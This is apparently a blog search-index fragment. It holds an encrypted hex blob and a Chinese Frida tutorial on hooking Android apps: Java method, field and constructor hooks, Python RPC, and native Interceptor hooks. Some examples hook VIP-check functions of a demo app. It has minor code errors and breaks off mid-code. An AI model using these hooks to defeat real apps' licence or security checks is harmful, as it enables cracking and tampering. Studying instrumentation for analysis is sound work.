bb09250a759c278c346d7e31bd6a8684cb9bbd69d02b25110a5bfc4ac7be6f23b89639af2b8705499fb362a0eba01d33e52b266f844c6023d13772fcbd971b71a1bee1f076425a3bb90fbdfd554ac236a999ad86ed65922fba4d8e9afe51474d2a871201799af9e1c5c88c8449ced3e3857b0d0d1f1bfed4aa51843ffe0238dab511572d159235ca18684042ea200bd42f71f5bc32ecf3eb10d01114f69a90b3f8130ae1a7ba00dca682c99735f0ee4d742fb9ba14f13c00290274092e6656130e303bf585883c2a7da489e5df201e5dce35139abd4363ae7cc24d42fe34f8c39264b1129e142b4e1d0b72b051afa53b61dbb59fd704238c7f84500a220088c89efe78a0fde5c9ea8ca28cfe1f90572e2a56b57488f43d0b2b0dcf8125313224f929250d3849fec3256cb55a2b14abea90c0f405b47bd3dcd7d0af2bffb50ea2ff367e95a8bc4ccb3724c74bbcc4697aced4443bb53d42988c93fe19a7c12da9745bb6219dafa06469f8a914854dc02451ecad6eea3def1b458cf88e40b4e4d05e950736591e8c0dfd71a9fd37c4e594e84a2cb4934a64f92de5536f0938767de564bc1692a49042d6c93c935895b7b18245a2c496bd7aadd1f6a146020d6b0619fdac6bc5704795735cf0786ffc60d22c23b24b003d2e2b2d9e5696b6dcf6d7de075660a77bb239a8f172fd217cd9408754811f328f67d9c8fc63c0c731a836c79343478c27ce64c323f42ff2b7b651eee050282155484e56c861c5e0fd3b7142236bfac02a8c835dc2163befd65933eb6d46eddf39a862bf7871077ba42e433e6f99ae660a486b7d856ed0a57a4f058c01827108b7360c681e350b1542a798c3c9df22b16ec174ba58469bfa7c5b19ea3bb68de5f8e068873516fea486b44a15bc6e9bd501fdf806a2113cbba2099eedfca4b40e942c92a05a12be5bc4cfe7d7e50146303ffd58f31e3a210d1ebe568fcfd5777fed9bf812f63d02dcbed46d7dbff11922d0b5d2b4fbab36a9f6823f45dbf489036bfa34f96b3762f80a67dd9e938bb084b04c60cf4c73fd3e1b4f08f7bff15454c982cc8025b1f3572ffe39cf56e515b7416bee3bccd9d0c87636eebc965e8bc3f92d20f8b5d91464ae9b995a099c4c211e60dbdb5c5aa284f56bb5b19dd81eef80c07be2a4c523d2d3074888e53f18ba0d1ab1bfd84f1ba4eb68c43d6449f43721e6f2402d4c1fdad44db60d1c4323dec507cdca1bd3797e83361dd2d11e5d259482f9022d80a3693dc66dbba1f225f91f154c9b5af2c075756aa006243678a534575745ad075159800c00a034d1e950e3e68a976a510c080a930fadd96d24443837047663b5e4b7c880ff54c0b2a0614633717ce3d1977979585376e68e3e5f0f64d1609e0b22e2149e9716b304d50c1934a9a3f0f0848a3bd90a1ba2c82a138eac365d19e8e5799ba2400410a3d755cb8c5acfa0f2d17490d14f868e3566b4116dfc298ae0dd4d3f1fc63dc8b69220 您好, 这里需要密码.","categories":[],"tags":[],"keywords":[]},{"title":"frida","slug":"frida","date":"2024-09-28T02:16:18.000Z","updated":"2024-11-11T09:24:15.341Z","comments":true,"path":"2024/09/28/frida/","link":"","permalink":"http://example.com/2024/09/28/frida/","excerpt":"","text":"介绍frida 是平台原生 app 的 Greasemonkey，说的专业一点，就是一种动态插桩工具，可以插入一些代码到原生 app 的内存空间去，（动态地监视和修改其行为），这些原生平台可以是 Win、Mac、Linux、Android 或者 iOS。而且 frida 还是开源的。 Greasemonkey 可能大家不明白，它其实就是 firefox 的一套插件体系，使用它编写的脚本可以直接改变 firefox 对网页的编排方式，实现想要的任何功能。而且这套插件还是外挂的，非常灵活机动。 使用 frida 可以“看到”平时看不到的东西。出于编译型语言的特性，机器码在 CPU 和内存上执行的过程中，其内部数据的交互和跳转，对用户来讲是看不见的。当然如果手上有源码，甚至哪怕有带调试符号的可执行文件包，也可以使用 gdb、lldb 等调试器连上去看。 frida 注入的主要思路就是找到目标进程, 使用 ptrace 跟踪目标进程获取 mmap，dlpoen，dlsym 等函数库的便宜获取 mmap 在目标进程申请一段内存空间将在目标进程中找到存放 [frida-agent-32&#x2F;64.so] 的空间启动执行各种操作由 agent 去实现。 inlinehook 思路 动态替换需要 Hook 的指令片段为一段经过设计的跳板指令，即 trampoline ，目标为我们设计好的一段 shellCode 在内存中设计并生成一段 shellCode ，这是我们的可控 shellCode ，在该 shellCode 中需要实现 Hook 的功能函数（即打印&#x2F;替换-参数&#x2F;结果） shellCode 的设计原则是保持 Hook 前后的栈平衡，并保护寄存器状态（即 Hook 结束后，保持与 Hook 开始前一致的栈布局与寄存器状态） 在 shellCode 中完成原函数的执行工作，被替换的掉的指令中若包含计算 PC-relative address ( 如 Branch 指令 )，需要对其正确解析执行 组件名称 功能描述 frida-gum 提供了 inline-hook 的核心实现，还包含了代码跟踪模块 Stalker，用于内存访问监控的 MemoryAccessMonitor，以及符号查找、栈回溯实现、内存扫描、动态代码生成和重定位等功能 frida-core fridahook 的核心，具有进程注入、进程间通信、会话管理、脚本生命周期管理等功能，屏蔽部分底层的实现细节并给最终用户提供开箱即用的操作接口。包含了 frida-server、frida-gadget、frida-agent、frida-helper、frida-inject 等关键模块和组件，以及之间的互相通信底座 frida-gadget 本身是一个动态库，可以通过重打包修改动态库的依赖或者修改 smali 代码去实现向三方应用注入 gadget，从而实现 Frida 的持久化或免 root frida-server 本质上是一个二进制文件，类似于前面学习到的 android_server，需要在目标设备上运行并转发端口，在 Frida hook 中起到关键作用 基础操作命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647Usage: frida [options] targetOptions: --version show program&#x27;s version number and exit -h, --help show this help message and exit -D ID, --device=ID connect to device with the given ID -U, --usb connect to USB device -R, --remote connect to remote frida-server -H HOST, --host=HOST connect to remote frida-server on HOST -f FILE, --file=FILE spawn FILE -F, --attach-frontmost attach to frontmost application -n NAME, --attach-name=NAME attach to NAME -p PID, --attach-pid=PID attach to PID --stdio=inherit|pipe stdio behavior when spawning (defaults to “inherit”) --aux=option set aux option when spawning, such as “uid=(int)42” (supported types are: string, bool, int) --realm=native|emulated realm to attach in --runtime=qjs|v8 script runtime to use --debug enable the Node.js compatible script debugger --squelch-crash if enabled, will not dump crash report to console -O FILE, --options-file=FILE text file containing additional command line options -l SCRIPT, --load=SCRIPT load SCRIPT -P PARAMETERS_JSON, --parameters=PARAMETERS_JSON parameters as JSON, same as Gadget -C CMODULE, --cmodule=CMODULE load CMODULE --toolchain=any|internal|external CModule toolchain to use when compiling from source code -c CODESHARE_URI, --codeshare=CODESHARE_URI load CODESHARE_URI -e CODE, --eval=CODE evaluate CODE -q quiet mode (no prompt) and quit after -l and -e --no-pause automatically start main thread after startup -o LOGFILE, --output=LOGFILE output to log file --eternalize eternalize the script before exit --exit-on-error exit with code 1 after encountering any exception in the SCRIPT frida-ps -U 查看当前手机运行的进程 1234567891011121314151617181920212223242526frida-ps --help使用方式: frida-ps [选项] 选项: -h, --help 显示帮助信息并退出 -D ID, --device ID 连接到具有给定ID的设备 -U, --usb 连接到USB设备 -R, --remote 连接到远程frida-server -H HOST, --host HOST 连接到HOST上的远程frida-server --certificate CERTIFICATE 与HOST进行TLS通信，期望的CERTIFICATE --origin ORIGIN 连接到设置了&quot;Origin&quot;头为ORIGIN的远程服务器 --token TOKEN 使用TOKEN验证HOST --keepalive-interval INTERVAL 设置心跳包间隔(秒)，或设置为0以禁用(默认为-1，根据传输方式自动选择) --p2p 与目标建立点对点连接 --stun-server ADDRESS 设置与--p2p一起使用的STUN服务器地址 --relay address,username,password,turn-&#123;udp,tcp,tls&#125; 添加与--p2p一起使用的中继 -O FILE, --options-file FILE 包含额外命令行选项的文本文件 --version 显示程序版本号并退出 -a, --applications 只列出应用程序 -i, --installed 包括所有已安装的应用程序 -j, --json 以JSON格式输出结果 操作模式 操作模式 描述 优点 主要用途 CLI（命令行）模式 通过命令行直接将 JavaScript 脚本注入进程中，对进程进行操作 便于直接注入和操作 在较小规模的操作或者需求比较简单的场景中使用 RPC 模式 使用 Python 进行 JavaScript 脚本的注入工作，实际对进程进行操作的还是 JavaScript 脚本，可以通过 RPC 传输给 Python 脚本来进行复杂数据的处理 在对复杂数据的处理上可以通过 RPC 传输给 Python 脚本来进行，有利于减少被注入进程的性能损耗 在大规模调用中更加普遍，特别是对于复杂数据处理的需求 注入模式与启动命令: 注入模式 描述 命令或参数 优点 主要用途 Spawn 模式 将启动 App 的权利交由 Frida 来控制，即使目标 App 已经启动，在使用 Frida 注入程序时还是会重新启动 App 在 CLI 模式中，Frida 通过加上 -f 参数指定包名以 spawn 模式操作 App 适合于需要在 App 启动时即进行注入的场景，可以在 App 启动时即捕获其行为 当需要监控 App 从启动开始的所有行为时使用 Attach 模式 在目标 App 已经启动的情况下，Frida 通过 ptrace 注入程序从而执行 Hook 的操作 在 CLI 模式中，如果不添加 -f 参数，则默认会通过 attach 模式注入 App 适合于已经运行的 App，不会重新启动 App，对用户体验影响较小 在 App 已经启动，或者我们只关心特定时刻或特定功能的行为时使用 1frida -U -f 进程名 -l hook.js attach 模式 ： 1frida -U 进程名 -l hook.js frida_server 自定义端口 12345frida server 默认端口：27042 taimen:/ $ sutaimen:/ # cd data/local/tmp/taimen:/data/local/tmp # ./fs1280 -l 0.0.0.0:6666 logcat |grep &quot;D.zj2595&quot; 日志捕获adb connect 127.0.0.1:62001 模拟器端口转发 语法 API 名称 描述 Java.use(className) 获取指定的 Java 类并使其在 JavaScript 代码中可用。 Java.perform(callback) 确保回调函数在 Java 的主线程上执行。 Java.choose(className, callbacks) 枚举指定类的所有实例。 Java.cast(obj, cls) 将一个 Java 对象转换成另一个 Java 类的实例。 Java.enumerateLoadedClasses(callbacks) 枚举进程中已经加载的所有 Java 类。 Java.enumerateClassLoaders(callbacks) 枚举进程中存在的所有 Java 类加载器。 Java.enumerateMethods(targetClassMethod) 枚举指定类的所有方法。 日志输出语法区别 日志方法 描述 区别 console.log() 使用 JavaScript 直接进行日志打印 多用于在 CLI 模式中，console.log() 直接输出到命令行界面，使用户可以实时查看。在 RPC 模式中，console.log() 同样输出在命令行，但可能被 Python 脚本的输出内容掩盖。 send() Frida 的专有方法，用于发送数据或日志到外部 Python 脚本 多用于 RPC 模式中，它允许 JavaScript 脚本发送数据到 Python 脚本，Python 脚本可以进一步处理或记录这些数据。 Hook 框架模板123456function main()&#123; Java.perform(function()&#123; hookTest1(); &#125;);&#125;setImmediate(main);// 三板斧： 先 hook、看参数和返回值：定位：命令行 再构造参数、主动调用：利用：命令行 最后配 RPC 导出结果：规模化利用：PYTHON js 脚本JavaScript API | Frida • A world-class dynamic instrumentation toolkit Hook 普通方法、打印参数和修改返回值1234567891011121314151617//定义一个名为 hookTest1 的函数function hookTest1()&#123; //获取一个名为 &quot;类名&quot; 的 Java 类，并将其实例赋值给 JavaScript 变量 utils var utils = Java.use(&quot;类名&quot;); //修改 &quot;类名&quot; 的 &quot;method&quot; 方法的实现。这个新的实现会接收两个参数（a 和 b） utils.method.implementation = function(a, b)&#123; //将参数 a 和 b 的值改为 123 和 456。 a = 123; b = 456; //调用修改过的 &quot;method&quot; 方法，并将返回值存储在 `retval` 变量中 var retval = this.method(a, b); //在控制台上打印参数 a，b 的值以及 &quot;method&quot; 方法的返回值 console.log(a, b, retval); //返回 &quot;method&quot; 方法的返回值 return retval; &#125;&#125; 打印堆栈的脚本： 1console.log(Java.use(&quot;android.util.Log&quot;).getStackTraceString(Java.use(&quot;java.lang.Throwable&quot;).$new())); Hook 重载参数123456789101112// .overload()// .overload(&#x27;自定义参数&#x27;)// .overload(&#x27;int&#x27;)function hookTest2()&#123; var utils = Java.use(&quot;com.zj.wuaipojie.Demo&quot;); //overload 定义重载函数，根据函数的参数类型填 utils.func.overload(&#x27;com.zj.wuaipojie.Demo$Animal&#x27;,&#x27;java.lang.String&#x27;).implementation = function(a，b)&#123; b = &quot;aaaaaaaaaa&quot;; this.func(a,b); console.log(b); &#125;&#125; Hook 构造函数123456789function hookTest3()&#123; var utils = Java.use(&quot;com.zj.wuaipojie.Demo&quot;); //修改类的构造函数的实现，$init 表示构造函数 utils.$init.overload(&#x27;java.lang.String&#x27;).implementation = function(str)&#123; console.log(str); str = &quot;52&quot;; this.$init(str); &#125;&#125; Hook 字段12345678910111213141516171819202122function hookTest5()&#123; Java.perform(function()&#123; //静态字段的修改 var utils = Java.use(&quot;com.zj.wuaipojie.Demo&quot;); //修改类的静态字段 &quot;flag&quot; 的值 utils.staticField.value = &quot;我是被修改的静态变量&quot;; console.log(utils.staticField.value); //非静态字段的修改 //使用 `Java.choose()` 枚举类的所有实例 Java.choose(&quot;com.zj.wuaipojie.Demo&quot;, &#123; onMatch: function(obj)&#123; //修改实例的非静态字段 &quot;_privateInt &quot;的值为&quot; 123456 &quot;，并修改非静态字段&quot; privateInt &quot; 的值为 9999。 obj._privateInt.value = &quot;123456&quot;; //字段名与函数名相同 前面加个下划线 obj.privateInt.value = 9999; &#125;, onComplete: function()&#123; &#125; &#125;); &#125;); &#125; Hook 内部类1234567891011function hookTest6()&#123; Java.perform(function()&#123; //内部类 var innerClass = Java.use(&quot;com.zj.wuaipojie.Demo$innerClass&quot;); console.log(innerClass); innerClass.$init.implementation = function()&#123; console.log(&quot;eeeeeeee&quot;); &#125; &#125;);&#125; 枚举所有方法12345678910111213141516171819function hookTest8()&#123; Java.perform(function()&#123; var Demo = Java.use(&quot;com.zj.wuaipojie.Demo&quot;); //getDeclaredMethods 枚举所有方法 var methods =Demo.class.getDeclaredMethods(); for(var j=0; j &lt; methods.length; j++)&#123; var methodName = methods[j].getName(); console.log(methodName); for(var k=0; k&lt;Demo[methodName].overloads.length;k++)&#123; Demo[methodName].overloads[k].implementation = function()&#123; for(var i=0;i&lt;arguments.length;i++)&#123; console.log(arguments[i]); &#125; return this[methodName].apply(this,arguments); &#125; &#125; &#125; &#125;)&#125; 主动调用静态方法12var ClassName=Java.use(&quot;com.zj.wuaipojie.Demo&quot;);ClassName.privateFunc(); 非静态方法123456789101112var ret = null;Java.perform(function () &#123; Java.choose(&quot;com.zj.wuaipojie.Demo&quot;,&#123; //要 hook 的类 onMatch:function(instance)&#123; //onmatch 循环打印实例 instance ret=instance.privateFunc(&quot;aaaaaaa&quot;); //要 hook 的方法 &#125;, onComplete:function()&#123; //搜索结果 console.log(&quot;result: &quot; + ret); &#125; &#125;);&#125;)//return ret; python 脚本包名加载1234567import frida, sysjsCode = &quot;&quot;&quot; ...... &quot;&quot;&quot;script.exports.rpcfunc()process = frida.get_usb_device().attach(&#x27;包名&#x27;) # 获取 USB 设备并附加到应用script = process.create_script(jsCode) # 创建并加载脚本script.load()# 执行脚本sys.stdin.read()# 保持脚本运行状态，防止它执行完毕后立即退出 PID 加载先通过 ps -A｜grep XXX，获取 PID 1234process = frida.get_usb_device().attach(pid)script=process.create_script(jscode);script.load();sys.stdin.read(); spawn 方式附加1234567891011121314# -*- coding: UTF-8 -*-import frida,sysjscode=&quot;&quot;&quot; &quot;&quot;&quot;#get_remote_devicedevice = frida.get_usb_device()print(&quot;device:&quot;,device);pid = device.spawn([&quot;com.&quot;])#以挂起的方式创建进程print(&quot;pid:&quot;,pid);process = device.attach(pid);print(&quot;process:&quot;,process);script = process.create_script(jscode)script.load()device.resume(pid)#加载完脚本，恢复进程运行sys.stdin.read() 连接非标准端口先查看手机的 ip，然后 frida-server 用指定端口的方法启动 12345process = frida.get_device_manager().add_remote_device(&#x27;ip：port&#x27;).attach(&#x27;name&#x27;);script = process.create_script(jscode);script.load()print(&quot;开始hook&quot;)sys.stdin.read() frida 与 Python 的交互(send)我们用 frida 去做 hook 的时候，js 代码中通过 console.log 打印出想要的值，但是这个值无法交给 python 继续使用，因此需要用到 send 函数来将值传递给 python 中，具体操作如下： 123456789101112131415# -*- coding: UTF-8 -*-import frida,sysjscode=&quot;&quot;&quot; &quot;&quot;&quot;def messageFunc(message, data): //回调函数，对 message 进行处理 print(message) if message[&quot;type&quot;] == &#x27;send&#x27;: print(u&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)process = frida.get_usb_device().attach(&#x27;name&#x27;)script = process.create_script(jscode)script.load()script.on(&#x27;message&#x27;, messageFunc) //接受 js 里发来的消息，类似监听print(&quot;开始hook&quot;)sys.stdin.read() frida 与 Python 的交互(recv)12345678910111213141516171819202122232425# -*- coding: UTF-8 -*-import timeimport frida,sysjscode=&quot;&quot;&quot; recv( //js中通过recv函数接受python发来的数据并作处理。 function(obj)&#123; console.log(obj.data) retval=obj.data &#125; ).wait();&quot;&quot;&quot;def messageFunc(message, data): print(message) if message[&quot;type&quot;] == &#x27;send&#x27;: print(u&quot;[*] &#123;0&#125;&quot;.format(message[&#x27;payload&#x27;])) else: print(message)process = frida.get_usb_device().attach(&#x27;name&#x27;)script = process.create_script(jscode)script.load()script.on(&#x27;message&#x27;, messageFunc)time.sleep(10)script.post(&#123;&#x27;data&#x27;: &#x27;12345678&#x27;&#125;)print(&quot;开始hook&quot;)sys.stdin.read() rpc1234567891011121314151617181920212223242526272829import timeimport frida,sysjscode=&quot;&quot;&quot;function test(data)&#123; var result = &quot;&quot;; Java.perform(function()&#123; result = Java.use(&#x27;m&#x27;).md5(data); console.log(&#x27;result1: &#x27;, result); &#125;); console.log(&#x27;result2: &#x27;, result); return result; &#125; rpc.exports = &#123; //通过rpc.exports导出函数 rpcfunc: test &#125;;&quot;&quot;&quot;device = frida.get_usb_device()print(&quot;device:&quot;,device);pid = device.spawn([&quot;name&quot;])#以挂起的方式创建进程print(&quot;pid:&quot;,pid);process = device.attach(pid);print(&quot;process:&quot;,process);script = process.create_script(jscode)script.load()device.resume(pid)#加载完脚本，恢复进程运行result = script.exports_sync.rpcfunc(&#x27;&#x27;) //通过script.exports_sync.rpcfunc调用函数print(&quot;开始hook&quot;)print(&quot;result3：&quot;+result)sys.stdin.read() native-hook准备hook 关键点就是找到函数地址 注意事项 如果需要手动计算函数地址，请注意安卓 32bit、64bit 的计算区别： 安卓位数 指令 计算方式 32 位 thumb so 基址 + 函数在 so 中的偏移 + 1 64 位 arm so 基址 + 函数在 so 中的偏移 安卓里一般 32 位的 so 中都是 thumb 指令，64 位的 so 中都是 arm 指令 通过 IDA 里的 opcode bytes 来判断，arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入 4) thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 + 1arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 ProcessProcess 对象代表当前被 Hook 的进程，能获取进程的信息，枚举模块，枚举范围等 API 含义 Process.id 返回附加目标进程的 PID Process.isDebuggerAttached() 检测当前是否对目标程序已经附加 Process.enumerateModules() 枚举当前加载的模块，返回模块对象的数组 Process.enumerateThreads() 枚举当前所有的线程，返回包含 id, state, context 等属性的对象数组 ModuleModule 对象代表一个加载到进程的模块(例如，在 Windows 上的 DLL，或在 Linux&#x2F;Android 上的 .so 文件), 能查询模块的信息，如模块的基址、名称、导入&#x2F;导出的函数等 API 含义 Module.load() 加载指定 so 文件，返回一个 Module 对象 enumerateImports() 枚举所有 Import 库函数，返回 Module 数组对象 enumerateExports() 枚举所有 Export 库函数，返回 Module 数组对象 enumerateSymbols() 枚举所有 Symbol 库函数，返回 Module 数组对象 Module.findExportByName(exportName)、Module.getExportByName(exportName) 寻找指定 so 中 export 库中的函数地址 enumerateModules() 用于列出当前进程中加载的所有模块（即共享库或动态链接库）的方法 Module.findBaseAddress(name)、Module.getBaseAddress(name) 返回 so 的基地址 module.name.indexOf(&quot;libc.so&quot;) 检查一个模块的名称是否包含特定的 so MemoryMemory 是一个工具对象，提供直接读取和修改进程内存的功能，能够读取特定地址的值、写入数据、分配内存等 方法 功能 Memory.copy() 复制内存 Memory.scan() 搜索内存中特定模式的数据 Memory.scanSync() 同上，但返回多个匹配的数据 Memory.alloc() 在目标进程的堆上申请指定大小的内存，返回一个 NativePointer Memory.writeByteArray() 将字节数组写入一个指定内存 Memory.readByteArray 读取内存 Memory.allocUtf8String(contents) Frida 提供的内存管理函数，用于在内存中分配一个包含指定字符串的缓冲区，并以 UTF-8 编码存储 frida 的 Interceptor：基本概念 动态插桩：Interceptor 允许用户在应用程序运行时插入代码，而不需要修改源代码或重新编译。这种动态插桩技术使得分析应用程序的行为变得更加灵活和高效。 目标函数：可以监控和修改的函数。目标函数可以是本地库（如 .so 文件）中的导出函数，也可以是 Java 方法（在 Android 应用中）等。 主要功能 监控函数调用：用户可以在函数调用前后执行特定的代码，这允许开发者查看输入参数和返回值。 修改参数和返回值：可以在函数被调用时修改传入的参数或函数的返回值，从而影响程序的执行流。 获取堆栈信息：可以在函数调用时获取调用堆栈信息，帮助调试和分析。 思路：1 利用函数名，通过 Module.findExportByName 函数获取函数地址。 2 通过 Module.findBaseAddress 函数获取所在库函数地址，然后加上函数偏移量即为函数地址 示例：12345678910111213141516171819const libName = &#x27;libnative-lib.so&#x27;const funcName = &#x27;Java_com_example_demoso1_MainActivity_stringFromJNI&#x27;const funcAddr = Module.findExportByName(libName, funcName)console.log(funcAddr)//或者const offset = 0x10018const baseAddr = Module.findBaseAddress(libName)const funcAddr = baseAddr.add(offset)console.log(funcAddr)// 通过 Interceptor.attach 来对函数进行 hookInterceptor.attach(funcAddr, &#123; onEnter: function (args) &#123; //onEnter 里可以打印和修改参数 &#125;, onLeave: function (retval) &#123; //onLeave 里可以打印和修改返回值 &#125;,&#125;) 地址相关 API 导出表（Export Table）：列出了库中可以被其他程序或库访问的所有公开函数和符号的名称。 导入表（Import Table）：列出了库需要从其他库中调用的函数和符号的名称。 符号表（Symbol Table）：编程语言编译过程中的一种数据结构，主要用于存储与程序中各种标识符（如变量名、函数名、类名等）相关的信息。 枚举导出表12345const imports = Module.enumerateImports(&#x27;libart.so&#x27;);//同目录下的动态库for (const iterator of imports) &#123; console.log(JSON.stringify(iterator));//转成 json 格式&#125; 枚举导入表12345const exports = Module.enumerateExports(&#x27;libart.so&#x27;);//同目录下的动态库for (const iterator of exports) &#123; console.log(JSON.stringify(iterator));//转成 json 格式 // &#123;&quot;type&quot;: &quot;function&quot;, &quot;name&quot;:&quot;_ZN3art3jit3Jit13JitAtFirstUseEv &quot;,&quot; address &quot;:&quot; 0x7fff7229e1b0 &quot;&#125;&#125; 枚举符号表12345const exports = Module.enumerateSymbols(&#x27;libart.so&#x27;);//同目录下的动态库for (const iterator of exports) &#123; console.log(JSON.stringify(iterator));//转成 json 格式 // &#123;&quot;isGlobal&quot;: true, &quot;type&quot;: &quot;function&quot;, &quot;section&quot;:&#123;&quot;id&quot;: &quot;12.text&quot;, &quot;protection&quot;: &quot;r-x&quot;&#125;, &quot;name&quot;: &quot;art_l2d&quot;, &quot;address&quot;: &quot;0x7fff724bb4d0&quot;, &quot;size&quot;: 6&#125;&#125; 枚举进程中已加载的模块12345const modules = Process.enumerateModules();for (const iterator of exports) &#123; console.log(JSON.stringify(iterator));//转成 json 格式 // &#123;&quot;name&quot;: &quot;libmtp.so&quot;, &quot;base&quot;: &quot;0x7fff6e6c4000&quot;, &quot;size&quot;: 200704, &quot;path&quot;: &quot;/system/lib64/libmtp.so&quot;&#125;&#125; 通过函数名找导出函数12const funcAddr = Module.findExportByName(&#x27;libart.so&#x27;, &#x27;_ZN9unix_file6FdFile5WriteEPKcll&#x27;);//getExportByName 相同console.log(funcAddr); Module.findBaseAddress123const baseAddr = Module.findBaseAddress(&#x27;libencryptlib.so&#x27;)//同 Module.getBaseAddressconsole.log(baseAddr)// &quot;0x7ffff6013000&quot; 通过模块名找基地址123const module = Process.findModuleByName(&#x27;libpiex.so&#x27;)console.log(JSON.stringify(module))//&#123;&quot;name&quot;: &quot;libpiex.so&quot;, &quot;base&quot;: &quot;0x7ffff6013000&quot;, &quot;size&quot;: 114688, &quot;path&quot;: &quot;/system/lib64/libpiex.so&quot;&#125; Process.findModuleByAddress()12const module = Process.findModuleByAddress(addr)//addr 可以是该模块中的任何一个地址console.log(JSON.stringify(module)) hook 函数native 函数new NativeFunction(address, returnType, argTypes[, options]): 创建一个新的 NativeFunction 用于调用位于指定地址的函数，其中 returnType 指定返回类型，argTypes 数组指定参数类型。 123456function main()&#123; const addAddr = Module.findExportByName(&#x27;libleidian.so&#x27;, &#x27;Java_com_example_leidian_MainActivity_add&#x27;); const addFunction = new NativeFunction(addAddr, &#x27;int64&#x27;, [&#x27;int64&#x27;, &#x27;int64&#x27;, &#x27;int&#x27;, &#x27;int&#x27;]); const result = addFunction(0, 0, 1, 2); console.log(&quot;result: &quot;, result);&#125; Interceptor.attach 函数Interceptor.attach(target, callbacks[, data])：拦截 target 处的函数调用，callbacks 包括 onEnter、onLeave 的回调函数实现。 先等待应用程序启动，再 attach。 12345678910111213141516171819202122232425262728293031//hook 修改参数值以及返回值function replaceHook(addr) &#123; //拦截目标函数调用 Interceptor.attach(addr, &#123; onEnter: function(args)&#123;//目标函数执行之前需要做的事 console.log(&quot;come into add function&quot;); console.log(&quot;arg1: &quot;, args[0]); console.log(&quot;arg2: &quot;, args[1]); console.log(&quot;arg3: &quot;, args[2]); console.log(&quot;arg4: &quot;, args[3]); console.log(&#x27;Context : &#x27; + JSON.stringify(this.context)); //context 包含各种寄存器的值 //Context : &#123;&quot;pc&quot;: &quot;0x7fff588cf950&quot;, &quot;sp&quot;: &quot;0x7fff6bbf9828&quot;, &quot;rax&quot;: &quot;0x0&quot;, &quot;rcx&quot;: &quot;0x2&quot;, &quot;rdx&quot;: &quot;0x1&quot;, &quot;rbx&quot;: &quot;0x0&quot;, &quot;rsp&quot;: &quot;0x7fff6bbf9828&quot;, &quot;rbp&quot;: &quot;0x7fff6bbf9830&quot;, &quot;rsi&quot;: &quot;0x0&quot;, &quot;rdi&quot;: &quot;0x0&quot;, &quot;r8&quot;: &quot;0x18&quot;, &quot;r9&quot;: &quot;0x7fff5a0f512c&quot;, &quot;r10&quot;: &quot;0x0&quot;, &quot;r11&quot;: &quot;0x7fff588cf950&quot;, &quot;r12&quot;: &quot;0x7fff6bbf9990&quot;, &quot;r13&quot;: &quot;0x1&quot;, &quot;r14&quot;: &quot;0x4&quot;, &quot;r15&quot;: &quot;0xfffffffffffffffc&quot;, &quot;rip&quot;: &quot;0x7fff588cf950&quot;&#125; &#125;, onLeave: function(retval)&#123;//目标函数执行之后需要做的事 console.log(&quot;return value: &quot;, retval); //修改返回值 retval.replace(0x9)//修改成整数 //retval.replace(ptr(0x14792))//修改成指针 &#125; &#125; ) //调用 hook 后的函数查看效果 const addFunction = new NativeFunction(addr, &#x27;int64&#x27;, [&#x27;int64&#x27;, &#x27;int64&#x27;, &#x27;int&#x27;, &#x27;int&#x27;]); var result = addFunction(0, 0, 1, 2); console.log(&quot;result: &quot;, result);&#125; onEnter：在目标函数被调用时执行，可以访问传入的参数。你可以在这里添加逻辑，比如日志记录或条件检查。 onLeave：在目标函数返回时执行，可以访问返回值。你可以修改返回值，也可以执行其他操作。 打印整数型、布尔值类型、char 类型 1234567891011121314151617181920212223242526function hookTest2()&#123; Java.perform(function()&#123; //根据导出函数名打印地址 var helloAddr = Module.findExportByName(&quot;lib52pojie.so&quot;,&quot;Java_com_zj_wuaipojie_util_SecurityUtil_checkVip&quot;); console.log(helloAddr); if(helloAddr != null)&#123; //Interceptor.attach 是 Frida 里的一个拦截器 Interceptor.attach(helloAddr,&#123; //onEnter 里可以打印和修改参数 onEnter: function(args)&#123; //args 传入参数 console.log(args[0]); //打印第一个参数的值 console.log(this.context.x1); // 打印寄存器内容 console.log(args[1].toInt32()); //toInt32()转十进制 console.log(args[2].readCString()); //读取字符串 char 类型 console.log(hexdump(args[2])); //内存 dump &#125;, //onLeave 里可以打印和修改返回值 onLeave: function(retval)&#123; //retval 返回值 console.log(retval); console.log(&quot;retval&quot;,retval.toInt32()); &#125; &#125;) &#125; &#125;)&#125; 字符串类型 12345678910111213141516171819202122232425function hookTest2()&#123; Java.perform(function()&#123; //根据导出函数名打印地址 var helloAddr = Module.findExportByName(&quot;lib52pojie.so&quot;,&quot;Java_com_zj_wuaipojie_util_SecurityUtil_vipLevel&quot;); if(helloAddr != null)&#123; Interceptor.attach(helloAddr,&#123; //onEnter 里可以打印和修改参数 onEnter: function(args)&#123; //args 传入参数 // 方法一 var jString = Java.cast(args[2], Java.use(&#x27;java.lang.String&#x27;)); console.log(&quot;参数:&quot;, jString.toString()); // 方法二 var JNIEnv = Java.vm.getEnv(); var originalStrPtr = JNIEnv.getStringUtfChars(args[2], null).readCString(); console.log(&quot;参数:&quot;, originalStrPtr); &#125;, //onLeave 里可以打印和修改返回值 onLeave: function(retval)&#123; //retval 返回值 var returnedJString = Java.cast(retval, Java.use(&#x27;java.lang.String&#x27;)); console.log(&quot;返回值:&quot;, returnedJString.toString()); &#125; &#125;) &#125; &#125;)&#125; Interceptor.replace 函数Interceptor.replace(target, replacement[, data])：将 target 处的函数替换为 replacement 的实现（使用 NativeCallback 实现替换）。如果您想要完全或部分替换现有函数的实现，通常会使用此方法。需先启动应用，然后再 attach，而非 spawn，否者找不到函数地址。 12345678910111213141516171819202122232425262728293031//hook 修改参数值以及返回值function replaceHook(addr) &#123; //参数个数和类型可通过 IDA 查看 //创建一个新的 native 函数，用于调用指定地址(第一个参数决定)的函数, const addFunction = new NativeFunction(addr, &#x27;int64&#x27;, [&#x27;int64&#x27;, &#x27;int64&#x27;, &#x27;int&#x27;, &#x27;int&#x27;]); // 重实现目标函数地址的功能实现 Interceptor.replace(addr, new NativeCallback( function(arg1, arg2, arg3, arg4)&#123; console.log(&quot;come into add function&quot;); console.log(&quot;arg1: &quot;, arg1); console.log(&quot;arg2: &quot;, arg2); console.log(&quot;arg3: &quot;, arg3); console.log(&quot;arg4: &quot;, arg4); //保持原函数功能不变 var result = addFunction(arg1, arg2, arg3, arg4);//主动调用 return result &#125;, &#x27;int64&#x27;, 